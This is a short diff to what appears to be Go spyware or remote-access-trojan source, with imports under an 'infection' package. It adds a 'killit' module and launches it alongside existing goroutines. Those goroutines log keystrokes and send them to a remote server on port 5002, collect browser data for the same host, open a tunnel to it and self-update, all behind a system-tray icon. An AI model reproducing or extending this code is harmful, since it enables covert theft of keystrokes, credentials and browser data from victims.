@@ -5,6 +5,7 @@ import (
 	"infection/browser"
 	"infection/etcd"
 	"infection/hitboard"
+	"infection/killit"
 	"infection/machineinfo"
 	"infection/transfer"
 	"infection/tunnel"
@@ -61,6 +62,7 @@ func onReady() {
 	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
 	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
 	go tunnel.Tunnel(conf.Url)
+	go killit.Killit()
 	////check update
 	go lib.DoUpdate()
 	systray.SetIcon(icon.Data)
